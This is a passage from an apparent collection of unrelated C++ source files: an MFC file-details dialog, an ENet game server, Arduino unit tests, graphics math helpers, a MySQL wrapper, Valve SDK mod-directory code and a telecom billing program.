Modify\"), 0, 200);\r\n\tfile_list_.InsertColumn(5, _T(\"Time to Created\"), 0, 200);\r\n\treturn TRUE;  // return TRUE  unless you set the focus to a control\r\n}\r\n\r\nvoid CFileDetailsDlg::OnSysCommand(UINT nID, LPARAM lParam)\r\n{\r\n\tif ((nID & 0xFFF0) == IDM_ABOUTBOX)\r\n\t{\r\n\t\tCAboutDlg dlgAbout;\r\n\t\tdlgAbout.DoModal();\r\n\t}\r\n\telse\r\n\t{\r\n\t\tCDialogEx::OnSysCommand(nID, lParam);\r\n\t}\r\n}\r\n\r\n// If you add a minimize button to your dialog, you will need the code below\r\n//  to draw the icon.  For MFC applications using the document/view model,\r\n//  this is automatically done for you by the framework.\r\n\r\nvoid CFileDetailsDlg::OnPaint()\r\n{\r\n\tif (IsIconic())\r\n\t{\r\n\t\tCPaintDC dc(this); // device context for painting\r\n\r\n\t\tSendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);\r\n\r\n\t\t// Center icon in client rectangle\r\n\t\tint cxIcon = GetSystemMetrics(SM_CXICON);\r\n\t\tint cyIcon = GetSystemMetrics(SM_CYICON);\r\n\t\tCRect rect;\r\n\t\tGetClientRect(&rect);\r\n\t\tint x = (rect.Width() - cxIcon + 1) / 2;\r\n\t\tint y = (rect.Height() - cyIcon + 1) / 2;\r\n\r\n\t\t// Draw the icon\r\n\t\tdc.DrawIcon(x, y, m_hIcon);\r\n\t}\r\n\telse\r\n\t{\r\n\t\tCDialogEx::OnPaint();\r\n\t}\r\n}\r\n\r\n// The system calls this function to obtain the cursor to display while the user drags\r\n//  the minimized window.\r\nHCURSOR CFileDetailsDlg::OnQueryDragIcon()\r\n{\r\n\treturn static_cast<HCURSOR>(m_hIcon);\r\n}\r\n\r\n\r\n\r\nvoid CFileDetailsDlg::OnBnClickedSearchButton()\r\n{\r\n\tUpdateData(TRUE);\r\n\r\n\tCString folder;\r\n\tfolder_browser_.GetWindowText(folder);\r\n\r\n\tCString file_name;\r\n\tfile_name_.GetWindowText(file_name);\r\n\r\n\tCString path = folder + _T(\"\\\\\") + file_name;\r\n\r\n\tif (PathFileExists(path)) {\r\n\t\tfile_list_.InsertItem(0, file_name);  // Get file name\r\n\t\tfile_list_.SetItemText(0, 3, path);   // Get path\r\n\r\n\t\t//Get file size\r\n\t\tWIN32_FIND_DATA file_data;\r\n\t\tHANDLE hFile = FindFirstFile(path, &file_data);\r\n\t\tDWORD file_size = file_data.nFileSizeLow;\r\n\t\tCString size;\r\n\t\tsize.Format(_T(\"%d\"), file_size);\r\n\t\tfile_list_.SetItemText(0, 1, size);\r\n\r\n\t\t//Get file owner\r\n\t\tSECURITY_DESCRIPTOR sd;\r\n\t\tSECURITY_INFORMATION si = OWNER_SECURITY_INFORMATION;\r\n\t\tDWORD size_needed = 0;\r\n\t\tGetFileSecurity(path, si, &sd, 0, &size_needed);\r\n\t\tSECURITY_DESCRIPTOR* pSD = (SECURITY_DESCRIPTOR*)malloc(size_needed);\r\n\t\tGetFileSecurity(path, si, pSD, size_needed, &size_needed);",
    "#include <iostream>\n#include \"Server.h\"\n#include \"enet/enet.h\"\n#include <map>\n#include \"Utility.h\"\n\nusing namespace std;\n\nmap<int, int*> clientsMap;\n\nvoid broadcastPacket(ENetHost* server, const char* data, bool reliable = true) {\n\tENetPacket* packet;\n\tif (reliable)\n\t\tpacket = enet_packet_create(data, 13, ENET_PACKET_FLAG_RELIABLE);\n\telse\n\t\tpacket = enet_packet_create(data, 13, 0);\n\tenet_host_broadcast(server, 0, packet);\n}\n\nvoid SendPacket(ENetPeer* peer, const char* data, bool reliable = true) {\n\tENetPacket* packet;\n\tif (reliable)\n\t\tpacket = enet_packet_create(data, 13, ENET_PACKET_FLAG_RELIABLE);\n\telse\n\t\tpacket = enet_packet_create(data, 13, 0);\n\tenet_peer_send(peer, 0, packet);\n}\n\nvoid parseData(ENetHost* server, int id, char* data) {\n\tcout << \"Parse: \" << data << \"\\n\";\n\n\tchar dataType;\n\tdataType = data[0];\n\tcout << \"Asta e dataType: \" << dataType << \"\\n\";\n\t\n\tswitch (dataType) {\n\tcase '1': {\n\t\tbroadcastPacket(server, data);\n\t\tbreak;\n\t}\n\tcase '2': {\n\t\tbroadcastPacket(server, data);\n\t\tbreak;\n\t}\n\t}\n}\n\nint serverMain() {\n\n\tif (enet_initialize()) {\n\t\tcout << \"An error occurred while initializing ENet.\\n\";\n\t\treturn EXIT_FAILURE;\n\t}\n\tatexit(enet_deinitialize);\n\n\tENetAddress address;\n\tENetHost* server;\n\tENetEvent event;\n\n\taddress.host = ENET_HOST_ANY;\n\taddress.port = 8080;\n\tserver = enet_host_create(&address, 32, 1, 0, 0);\n\n\tif (!server) {\n\t\tcout << \"An error occurred while trying to create an ENet server host!\\n\";\n\t\treturn EXIT_FAILURE;\n\t}\n\n\t//// PROGRAM LOOP START\n\tint newPlayerId = 0;\n\n\n\twhile (true) {\n\t\twhile (enet_host_service(server, &event, 1000) > 0) {\n\t\t\tif (event.type == ENET_EVENT_TYPE_CONNECT) {\n\t\t\t\tcout << \"A new client connected from \" << event.peer->address.host\n\t\t\t\t\t<< \":\" << event.peer->address.port << \"\\n\";\n\t\t\t\t\n\t\t\t\t/*for (auto const& x : ClientMap) {\n\t\t\t\t\tchar sendData[1024] = { '\\0' };\n\t\t\t\t\tsprintf_s(sendData, \"2|%d|%s\", x.first, x.second -> getUsername().c_str());\n\t\t\t\t\tbroadcastPacket(server, sendData);\n\t\t\t\t}*/\n\n\t\t\t\tfor (auto const& x : clientsMap) {\n\t\t\t\t\tchar message[13];\n\t\t\t\t\tpackData(message, '2', x.first, 50, 20);\n\t\t\t\t\tint id;\n\t\t\t\t\tfloat x1, y;\n\t\t\t\t\tchar c;\n\t\t\t\t\tunpackData(message, c, id, x1, y);\n\t\t\t\t\tcout << \"Message: \" << message << \"\\n\";\n\t\t\t\t\tcout << \"x.first: \" << x.first << \"\\n\";\n\t\t\t\t\tcout << \"id: \" << id << \"\\n\";\n\t\t\t\t\tcout << \"x1: \" << x1 << \"\\n\";\n\t\t\t\t\tcout << \"y: \" << y << \"\\n\";\n\n\t\t\t\t\tfor (int i = 0; i < 13; i++)\n\t\t\t\t\t\tcout << message[i] << \" \";\n\t\t\t\t\tcout << \"\\n\";\n\n\t\t\t\t\tSendPacket(event.peer, message);\n\t\t\t\t}\n\n\t\t\t\tnewPlayerId++;\n\t\t\t\tclientsMap[newPlayerId] = new int(newPlayerId);\n\t\t\t\tevent.peer->data = clientsMap[newPlayerId];\n\n\t\t\t\tchar message[13];\n\t\t\t\tpackData(message, '3', newPlayerId, 0, 0);\n\t\t\t\tSendPacket(event.peer, message);\n\n\t\t\t\tpackData(message, '2', newPlayerId, 50, 20);\n\t\t\t\tbroadcastPacket(server, message);\n\n\t\t\t}\n\t\t\telse if (event.type == ENET_EVENT_TYPE_RECEIVE) {\n\t\t\t\tcout << \"A packet of length \" << event.packet->dataLength\n\t\t\t\t\t<< \"containing \" << event.packet->data\n\t\t\t\t\t<< \"was received from \" << event.peer->data\n\t\t\t\t\t<< \"on IP \" << event.peer->address.host\n\t\t\t\t\t<< \":\" << event.peer->address.port\n\t\t\t\t\t<< \"on channel \" << event.channelID << \"\\n\";\n\t\t\t\tparseData(server, *((int*) event.peer->data), (char*)event.packet->data);\n\t\t\t\tenet_packet_destroy(event.packet);\n\t\t\t}\n\t\t\telse if (event.type == ENET_EVENT_TYPE_DISCONNECT) {\n\t\t\t\tcout << event.peer->address.host << event.peer->address.port << \" disconnected.\\n\";\n\t\t\t\tchar message[13];\n\t\t\t\tint id = *((int*)event.peer->data);\n\t\t\t\tpackData(message, '4', id, 0, 0);\n\t\t\t\t//char disconnectedData[126] = { '\\0' };\n\t\t\t\t//sprintf_s(disconnectedData, \"4|%d\", *((int*)event.peer->data));\n\t\t\t\tbroadcastPacket(server, message);\n\t\t\t\tclientsMap.erase(id);\n\t\t\t\tevent.peer->data = NULL;\n\t\t\t}\n\t\t}\n\t}\n\n\t//// PROGRAM LOOP END\n\n\tenet_host_destroy(server);\n\n\treturn EXIT_SUCCESS;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"foodie_fat\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//\n//    FILE: unit_test_001.cpp\n//  AUTHOR: Rob Tillaart\n// VERSION: 0.1.0\n//    DATE: 2021-03-16\n// PURPOSE: unit tests for the ADG729 I2C matrix switch. 2x4 Multiplexer.\n//          https://github.com/RobTillaart/ADG729\n//          https://github.com/Arduino-CI/arduino_ci/blob/master/REFERENCE.md\n//\n\n// supported assertions\n// ----------------------------\n// assertEqual(expected, actual);               // a == b\n// assertNotEqual(unwanted, actual);            // a != b\n// assertComparativeEquivalent(expected, actual);    // abs(a - b) == 0 or (!(a > b) && !(a < b))\n// assertComparativeNotEquivalent(unwanted, actual); // abs(a - b) > 0  or ((a > b) || (a < b))\n// assertLess(upperBound, actual);              // a < b\n// assertMore(lowerBound, actual);              // a > b\n// assertLessOrEqual(upperBound, actual);       // a <= b\n// assertMoreOrEqual(lowerBound, actual);       // a >= b\n// assertTrue(actual);\n// assertFalse(actual);\n// assertNull(actual);\n\n// // special cases for floats\n// assertEqualFloat(expected, actual, epsilon);    // fabs(a - b) <= epsilon\n// assertNotEqualFloat(unwanted, actual, epsilon); // fabs(a - b) >= epsilon\n// assertInfinity(actual);                         // isinf(a)\n// assertNotInfinity(actual);                      // !isinf(a)\n// assertNAN(arg);                                 // isnan(a)\n// assertNotNAN(arg);                              // !isnan(a)\n\n/*\n  most unit tests will test for fail\n  as there is no sensor connected\n  and there is no mockup.\n\n  It appears that Wire.write does not fail without sensor...\n*/\n\n\n#include <ArduinoUnitTests.h>\n\n#include \"Arduino.h\"\n#include \"ADG729.h\"\n\n\nint expect;  //  TODO needed as there seems a problem with 8 bit comparisons (char?)\n\nuint32_t start, stop;\n\n\nunittest_setup()\n{\n  fprintf(stderr, \"ADG729_LIB_VERSION: %s\\n\", (char *) ADG729_LIB_VERSION);\n}\n\n\nunittest_teardown()\n{\n}\n\n\nunittest(test_constants)\n{\n  assertEqual(0,   ADG729_OK);\n  assertEqual(-10, ADG729_ERROR_I2C);\n  assertEqual(-20, ADG729_ERROR_CHANNEL);\n}\n\n\nunittest(test_constructor)\n{\n  ADG729 adg(0x4C);\n\n  Wire.begin();\n\n  assertTrue(adg.begin());\n  assertTrue(adg.isConnected());\n  assertEqual(8, adg.channelCount());\n}\n\n\nunittest(test_enable)\n{\n  ADG729 adg(0x4C);\n\n  Wire.begin();\n\n  bool b = adg.begin();\n  assertEqual(b, true);\n\n  uint8_t mask = 0x00;\n  for (int chan = 0; chan < 8; chan++)\n  {\n    adg.enableChannel(chan);\n    assertTrue(adg.isEnabled(chan));\n  }\n  assertEqual(0xFF, adg.getChannelMask());\n  adg.setChannelMask(0x00);\n  assertEqual(0x00, adg.getChannelMask());\n}\n\n\nunittest(test_select)\n{\n  ADG729 adg(0x4C);\n\n  Wire.begin();\n\n  bool b = adg.begin();\n  assertEqual(b, true);\n\n  uint8_t mask = 0x00;\n  for (int chan = 0; chan < 8; chan++)\n  {\n    adg.selectChannel(chan);\n    assertTrue(adg.isEnabled(chan));\n  }\n  assertEqual(0x80, adg.getChannelMask());\n  adg.setChannelMask(0x00);\n  assertEqual(0x00, adg.getChannelMask());\n}\n\n\nunittest_main()\n\n\n//  -- END OF FILE --\n\n",
    "#include \"entities/Laser.hpp\"\n#include \"Constants.hpp\"\n\nLaser::Laser(Vector2 position, Vector2 velocity, Texture2D texture)\n    : mPosition{position}\n    , mVelocity{velocity}\n    , mActive{true}\n    , mTexture(texture)\n    , mRotation{atan2f(mVelocity.y, mVelocity.x) * RAD2DEG - 90.0f}\n    , mOrigin{position}\n    , mMaxRange{50.0f}\n    , mDistanceTraveled{0} {}\n\nvoid Laser::update() {\n    if (this->mActive) {\n        this->mPosition.x += this->mVelocity.x * 5.0f;\n        this->mPosition.y += this->mVelocity.y * 5.0f;\n        this->mDistanceTraveled += hypot(this->mVelocity.x, this->mVelocity.y);\n        if (this->mDistanceTraveled > this->mMaxRange) {\n            this->mActive = false;\n        }\n    }\n}\n\nvoid Laser::draw() {\n    DrawTexturePro(this->mTexture, {0, 0, (float)this->mTexture.width, (float)this->mTexture.height},\n                   {this->mPosition.x, this->mPosition.y, (float)this->mTexture.width, (float)this->mTexture.height},\n                   {(float)this->mTexture.width / 2, (float)this->mTexture.height / 2}, this->mRotation, WHITE);\n}\n\nbool Laser::isActive() const {\n    return this->mActive;\n}\n\nVector2 Laser::getPosition() const {\n    return this->mPosition;\n}\n\nvoid Laser::setActive(bool statement) {\n    this->mActive = statement;\n}\n",
    "#include <Novice.h>\n#include <cmath>\n#include \"Vector3.h\"\n#include <assert.h>\n#define _USE_MATH_DEFINES\n#include <math.h>\n#include <imgui.h>\n\n\nstruct Matrix4x4\n{\n\tfloat m[4][4];\n\n};\n\nstruct Sphere {\n\tVector3 center;\n\tfloat radius;\n\n};\n\nstruct Segment {\n\tVector3 origin;\n\tVector3 diff;\n\n};\n\nstruct Plane {\n\tVector3 normal;\n\tfloat distance;\n};\n\nstruct Triangle {\n\tVector3 vertices[3];\n};\n\nVector3 Add(const Vector3& v1, const Vector3& v2) {\n\tVector3 result;\n\n\tresult.x = v1.x + v2.x;\n\tresult.y = v1.y + v2.y;\n\tresult.z = v1.z + v2.z;\n\n\treturn result;\n}\n\nMatrix4x4 Multiply(const Matrix4x4& m1, const Matrix4x4& m2) {\n\tMatrix4x4 result;\n\n\tfor (int i = 0; i < 4; ++i) {\n\t\tfor (int j = 0; j < 4; ++j) {\n\t\t\tresult.m[i][j] = 0;\n\t\t\tfor (int k = 0; k < 4; ++k) {\n\t\t\t\tresult.m[i][j] += m1.m[i][k] * m2.m[k][j];\n\t\t\t}\n\t\t}\n\t}\n\treturn result;\n}\n\nMatrix4x4 MakeRotateXMatrix(float radian) {\n\n\tMatrix4x4 result;\n\n\tresult = {\n\t\t1.0f,0.0f,0.0f,0.0f,\n\t\t0.0f,cosf(radian),sinf(radian),0.0f,\n\t\t0.0f,-sinf(radian),cosf(radian),0.0f,\n\t\t0.0f,0.0f,0.0f,1.0f };\n\treturn result;\n}\n\nMatrix4x4 MakeRotateYMatrix(float radian) {\n\n\tMatrix4x4 result;\n\n\tresult = {\n\t\tcosf(radian),0.0f,-sinf(radian),0.0f,\n\t\t0.0f,1.0f,0.0f,0.0f,\n\t\tsinf(radian),0.0f,cosf(radian),0.0f,\n\t\t0.0f,0.0f,0.0f,1.0f };\n\treturn result;\n\n\n}\n\nMatrix4x4 MakeRotateZMatrix(float radian) {\n\n\tMatrix4x4 result;\n\n\tresult = {\n\t\tcosf(radian),sinf(radian),0.0f,0.0f,\n\t\t-sinf(radian),cosf(radian),0.0f,0.0f,\n\t\t0.0f,0.0f,1.0f,0.0f,\n\t\t0.0f,0.0f,0.0f,1.0f };\n\treturn result;\n\n\n}\n\nMatrix4x4 MakeAffineMatrix(const Vector3& scale, const Vector3& rotate, const Vector3& translate) {\n\n\tMatrix4x4 rotateXMatrix = MakeRotateXMatrix(rotate.x);\n\tMatrix4x4 rotateYMatrix = MakeRotateYMatrix(rotate.y);\n\tMatrix4x4 rotateZMatrix = MakeRotateZMatrix(rotate.z);\n\tMatrix4x4 rotateXYZMatrix = Multiply(rotateXMatrix, Multiply(rotateYMatrix, rotateZMatrix));\n\n\tMatrix4x4 result;\n\tresult = {\n\t\tscale.x * rotateXYZMatrix.m[0][0],scale.x * rotateXYZMatrix.m[0][1],scale.x * rotateXYZMatrix.m[0][2],0.0f,\n\t\tscale.y * rotateXYZMatrix.m[1][0],scale.y * rotateXYZMatrix.m[1][1],scale.y * rotateXYZMatrix.m[1][2],0.0f,\n\t\tscale.z * rotateXYZMatrix.m[2][0],scale.z * rotateXYZMatrix.m[2][1],scale.z * rotateXYZMatrix.m[2][2],0.0f,\n\t\ttranslate.x,translate.y,translate.z,1.0f\n\t};\n\treturn result;\n}\n\nMatrix4x4 MakePerspectiveFovMatrix(float fovY, float aspectRatio, float nearClip, float farClip) {\n\tMatrix4x4 result;\n\n\tresult = {\n\t\t1 / aspectRatio * (1 / tanf(fovY / 2)),0.0f,0.0f,0.0f,\n\t\t0.0f,(1 / tanf(fovY / 2)),0.0f,0.0f,\n\t\t0.0f,0.0f,farClip / (farClip - nearClip),1.0f,\n\t\t0.0f,0.0f,-farClip * nearClip / (farClip - nearClip),0.0f\n\t};\n\n\treturn result;\n\n}\n\nMatrix4x4 MakeOrthographicMatrix(float left, float top, float right, float bottom, float nearClip, float farClip) {\n\n\tMatrix4x4 result;\n\tresult = {\n\t2 / (right - left),0.0f,0.0f,0.0f,\n\t0.0f,2 / (top - bottom),0.0f,0.0f,\n\t0.0f,0.0f,1 / (farClip - nearClip),0.0f,\n\t(left + right) / (left - right),(top + bottom) / (bottom - top),nearClip / (nearClip - farClip),1.0f\n\t};\n\treturn result;\n}\n\nMatrix4x4 MakeViewportMatrix(float left, float top, float width, float height, float minDepth, float maxDepth) {\n\n\tMatrix4x4 result;\n\n\tresult = {\n\twidth / 2,0.0f,0.0f,0.0f,\n\t0.0f,-(height / 2),0.0f,0.0f,\n\t0.0f,0.0f,maxDepth - minDepth,0.0f,\n\tleft + (width / 2),top + (height / 2),minDepth,1.0f\n\t};\n\n\n\treturn result;\n}\n\nVector3 Transform(const Vector3& vector, const Matrix4x4& matrix) {\n\n\tfloat w = vector.x * matrix.m[0][3] + vector.y * matrix.m[1][3] + vector.z * matrix.m[2][3] + 1.0f * matrix.m[3][3];\n\tassert(w != 0.0f);\n\n\tVector3 result;\n\tresult.x = vector.x * matrix.m[0][0] + vector.y * matrix.m[1][0] + vector.z * matrix.m[2][0] + 1.0f * matrix.m[3][0];\n\tresult.y = vector.x * matrix.m[0][1] + vector.y * matrix.m[1][1] + vector.z * matrix.m[2][1] + 1.0f * matrix.m[3][1];\n\tresult.z = vector.x * matrix.m[0][2] + vector.y * matrix.m[1][2] + vector.z * matrix.m[2][2] + 1.0f * matrix.m[3][2];\n\n\tresult.x /= w;\n\tresult.y /= w;\n\tresult.z /= w;\n\n\n\treturn result;\n\n}\n\nMatrix4x4 Inverse(const Matrix4x4& m) {\n\tMatrix4x4 result;\n\tfloat A;\n\tA = m.m[0][0] * m.m[1][1] * m.m[2][2] * m.m[3][3] + m.m[0][0] * m.m[1][2] * m.m[2][3] * m.m[3][1] + m.m[0][0] * m.m[1][3] * m.m[2][1] * m.m[3][2]\n\t\t- m.m[0][0] * m.m[1][3] * m.m[2][2] * m.m[3][1] - m.m[0][0] * m.m[1][2] * m.m[2][1] * m.m[3][3] - m.m[0][0] * m.m[1][1] * m.m[2][3] * m.m[3][2]\n\t\t- m.m[0][1] * m.m[1][0] * m.m[2][2] * m.m[3][3] - m.m[0][2] * m.m[1][0] * m.m[2][3] * m.m[3][1] - m.m[0][3] * m.m[1][0] * m.m[2][1] * m.m[3][2]\n\t\t+ m.m[0][3] * m.m[1][0] * m.m[2][2] * m.m[3][1] + m.m[0][2] * m.m[1][0] * m.m[2][1] * m.m[3][3] + m.m[0][1] * m.m[1][0] * m.m[2][3] * m.m[3][2]\n\t\t+ m.m[0][1] * m.m[1][2] * m.m[2][0] * m.m[3][3] + m.m[0][2] * m.m[1][3] * m.m[2][0] * m.m[3][1] + m.m[0][3] * m.m[1][1] * m.m[2][0] * m.m[3][2]\n\t\t- m.m[0][3] * m.m[1][2] * m.m[2][0] * m.m[3][1] - m.m[0][2] * m.m[1][1] * m.m[2][0] * m.m[3][3] - m.m[0][1] * m.m[1][3] * m.m[2][0] * m.m[3][2]\n\t\t- m.m[0][1] * m.m[1][2] * m.m[2][3] ",
    "#include \"database.h\"\n#include <stdexcept>\n\nDatabase::Database(const std::string& host, const std::string& user, const std::string& password, const std::string& database)\n    : host(host), user(user), password(password), database(database), driver(nullptr), connection(nullptr) {\n    driver = sql::mysql::get_mysql_driver_instance();\n}\n\nDatabase::~Database() {\n    disconnect();\n}\n\nvoid Database::connect() {\n    if (!driver) {\n        throw std::runtime_error(\"Database driver not initialized.\");\n    }\n    connection.reset(driver->connect(host, user, password));\n    if (!connection) {\n        throw std::runtime_error(\"Failed to connect to the database.\");\n    }\n    connection->setSchema(database);\n}\n\nvoid Database::disconnect() {\n    if (connection) {\n        connection->close();\n        connection.reset();\n    }\n}\n\nvoid Database::executeQuery(const std::string& query) {\n    if (!connection) {\n        throw std::runtime_error(\"Database connection is not established.\");\n    }\n    std::unique_ptr<sql::Statement> stmt(connection->createStatement());\n    stmt->execute(query);\n}\n\nstd::unique_ptr<sql::ResultSet> Database::executeSelectQuery(const std::string& query) {\n    if (!connection) {\n        throw std::runtime_error(\"Database connection is not established.\");\n    }\n    std::unique_ptr<sql::Statement> stmt(connection->createStatement());\n    return std::unique_ptr<sql::ResultSet>(stmt->executeQuery(query));\n}\n",
    "//========= Copyright Valve Corporation, All rights reserved. ============//\r\n/**\r\n * Utility class for providing some basic capabilities for enumerating and specifying MOD\r\n * directories.\r\n *\r\n * \\version 1.0\r\n *\r\n * \\date 07-18-2006\r\n *\r\n * \\author mdurand\r\n *\r\n * \\todo \r\n *\r\n * \\bug \r\n *\r\n */\r\n#include \"ModConfigsHelper.h\"\r\n#include <windows.h>\r\n\r\nModConfigsHelper::ModConfigsHelper()\r\n{\r\n\tsetSourceModBaseDir();\r\n\tEnumerateModDirs();\r\n}\r\n\r\n\r\n/**\r\n* Default destructor. \r\n*/\r\nModConfigsHelper::~ModConfigsHelper()\r\n{\r\n\t// Empty the vector of directory names\r\n\tm_ModDirs.PurgeAndDeleteElements();\r\n}\r\n\r\n\r\n/**\r\n* Getter method that provides the parent directory for all MODs.\r\n* \\return parent directory for all MODs\r\n*/\r\nconst char *ModConfigsHelper::getSourceModBaseDir()\r\n{\r\n\treturn m_sourceModBaseDir;\r\n}\r\n\r\n/**\r\n* Getter method that provides a vector of the names of each MOD found.\r\n* \\return vector of the names of each MOD found\r\n*/\r\nconst CUtlVector<char *> &ModConfigsHelper::getModDirsVector()\r\n{\r\n\treturn m_ModDirs;\r\n}\r\n\r\n\r\n/**\r\n* Determines and sets the base directory for all MODs\r\n*/\r\nvoid ModConfigsHelper::setSourceModBaseDir()\r\n{\r\n\tQ_strncpy( m_sourceModBaseDir, GetSDKLauncherBaseDirectory(), sizeof( m_sourceModBaseDir) );    // Start with the base directory\r\n\tQ_StripLastDir( m_sourceModBaseDir, sizeof( m_sourceModBaseDir ) );\t\t\t\t\t\t\t\t// Get rid of the 'sourcesdk' directory.\r\n\tQ_StripLastDir( m_sourceModBaseDir, sizeof( m_sourceModBaseDir ) );\t\t\t\t\t\t\t\t// Get rid of the '%USER%' directory.\r\n\tQ_strncat( m_sourceModBaseDir, \"SourceMods\", sizeof( m_sourceModBaseDir ), COPY_ALL_CHARACTERS ); // Add 'SourceMods'\r\n}\r\n\r\n\r\n/**\r\n* Searches the parent MOD directory for child MODs and puts their names in the member vector\r\n*/\r\nvoid ModConfigsHelper::EnumerateModDirs()\r\n{\r\n\tchar szWildCardPath[MAX_PATH];\r\n\tWIN32_FIND_DATA wfd;\r\n\r\n\tQ_strncpy( szWildCardPath, m_sourceModBaseDir, sizeof( szWildCardPath ) );\r\n\tQ_AppendSlash( szWildCardPath, sizeof( szWildCardPath ) );\r\n\tQ_strncat( szWildCardPath, \"*.*\", sizeof( szWildCardPath ), COPY_ALL_CHARACTERS );\r\n\r\n\tHANDLE ff = FindFirstFile( szWildCardPath, &wfd );\r\n\r\n\tdo\r\n\t{\r\n\t\tif ( wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )\r\n\t\t{\r\n\t\t\tif ( wfd.cFileName[ 0 ] == '.' )\r\n\t\t\t{\r\n\t\t\t\tcontinue;\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\t// They are directories not named '.' or '..' so add them to the list of mod directories\r\n\t\t\t\tchar *dirName = new char[ strlen( wfd.cFileName ) + 1 ];\r\n\t\t\t\tQ_strncpy( dirName, wfd.cFileName, strlen( wfd.cFileName ) + 1 );\r\n\t\t\t\tm_ModDirs.AddToTail( dirName );\r\n\t\t\t}\r\n\t\t}\r\n\t} while ( FindNextFile( ff, &wfd ) );\r\n}",
    "#include <iostream>\r\n#include <fstream>\r\n#include <vector>\r\n#include <iomanip>\r\n#include<algorithm>\r\n#include \"bill.h\"\r\n#include \"operator.h\"\r\n#include \"vox.h\"\r\n#include \"internet.h\"\r\n#include \"customer.h\"\r\n\r\nusing namespace std;\r\n\r\nint main(int argc, char* argv[]) {\r\n    ifstream inputFile;\r\n    ofstream outputFile;\r\n\r\n    if (argc != 3) {\r\n        cout << \"usage: \" << argv[0] << \" input_file output_file\\n\";\r\n        return -1;\r\n    }\r\n\r\n    inputFile.open(argv[1]);\r\n    if (!inputFile.is_open()) {\r\n        cout << argv[0] << \": File \\\"\" << argv[1] << \"\\\" not found\\n\";\r\n        return -1;\r\n    }\r\n\r\n    outputFile.open(argv[2]);\r\n    if (!outputFile.is_open()) {\r\n        cout << argv[0] << \": Unable to create output file \\\"\" << argv[2] << \"\\\"\\n\";\r\n        return -1;\r\n    }\r\n\r\n    vector<Customer*> customers;\r\n    vector<Operator*> operators;\r\n\r\n    int C, O, N;\r\n    inputFile >> C >> O >> N;\r\n\r\n    customers.resize(C);\r\n    operators.resize(O);\r\n\r\n    int idClient = 0;\r\n    int idOperator = 0;\r\n    int age, operatorId;\r\n    double limit;\r\n    string name;\r\n    int opType;\r\n    double talkingCharge, messageCost, networkCharge, discountRate;\r\n    Operator* op;\r\n    Customer* customer;\r\n    int id1, id2;\r\n    double quantity, time, amount;\r\n    int id;\r\n\r\n    for (int i = 0; i < N; ++i) {\r\n        int operationType;\r\n        inputFile >> operationType;\r\n        switch (operationType) {\r\n            case 1:\r\n                inputFile >> name >> age >> operatorId >> limit;\r\n                customer = new Customer(idClient, name, age, operators[operatorId], limit);\r\n                customers[idClient] = customer;\r\n                idClient++;\r\n                break;\r\n            case 2:\r\n                inputFile >> opType >> talkingCharge >> messageCost >> networkCharge >> discountRate;\r\n                if (opType == 1) {\r\n                    op = new VoxOperator(idOperator, talkingCharge, messageCost, networkCharge, discountRate, VOX);\r\n                } else if (opType == 2) {\r\n                    op = new InternetOperator(idOperator, talkingCharge, messageCost, networkCharge, discountRate, INTERNET);\r\n                }\r\n                operators[idOperator] = op;\r\n                idOperator++;\r\n                break;\r\n            case 3:\r\n                inputFile >> id1 >> id2 >> time;\r\n                customers[id1]->talk(time, *customers[id2]);\r\n                break;\r\n            case 4:\r\n                inputFile >> id1 >> id2 >> quantity;\r\n                customers[id1]->message(quantity, *customers[id2]);\r\n                break;\r\n            case 5:\r\n                inputFile >> id >> amount;\r\n                customers[id]->connection(amount);\r\n                break;\r\n            case 6:\r\n                inputFile >> id >> amount;\r\n                customers[id]->pay(amount);\r\n                break;\r\n            case 7:\r\n                inputFile >> id1 >> id2;\r\n                customers[id1]->setOperator(operators[id2]);\r\n                break;\r\n            case 8:\r\n                inputFile >> id >> amount;\r\n                customers[id]->getBill()->changeTheLimit(amount);\r\n                break;\r\n            default:\r\n                break;\r\n        }\r\n    }\r\n\r\noutputFile << fixed << setprecision(2);\r\n\r\n    for (auto& op : operators) {\r\n        outputFile << \"Operator \" << op->getId() << \": \" << op->getTotalSpentTalkingTime() << \" \"\r\n                   << op->getTotalMessageSent() << \" \" << op->getTotalInternetUsage() << \"\\n\";\r\n    }\r\n\r\n    for (auto& customer : customers) {\r\n        outputFile << \"Customer \" << customer->getId() << \": \" << customer->getBill()->getTotalMoneySpent() << \" \"\r\n                   << customer->getBill()->getCurrentDebt() << \"\\n\";\r\n    }\r\n\r\n    Customer* topTalker = nullptr;\r\n    for (auto& customer : customers) {\r\n        if (!topTalker || customer->getTotalSpentTalkingTime() > topTalker->getTotalSpentTalkingTime() ||\r\n            (customer->getTotalSpentTalkingTime() == topTalker->getTotalSpentTalkingTime() && customer->getId() < topTalker->getId())) {\r\n            topTalker = customer;\r\n        }\r\n    }\r\n    if (topTalker) {\r\n        outputFile << topTalker->getName() << \": \" << topTalker->getTotalSpentTalkingTime() << \"\\n\";\r\n    }\r\n\r\n    Customer* topMessenger = nullptr;\r\n    for (auto& customer : customers) {\r\n        if (!topMessenger || customer->getTotalMessageSent() > topMessenger->getTotalMessageSent() ||\r\n            (customer->getTotalMessageSent() == topMessenger->getTotalMessageSent() && customer->getId() < topMessenger->getId())) {\r\n            topMessenger = 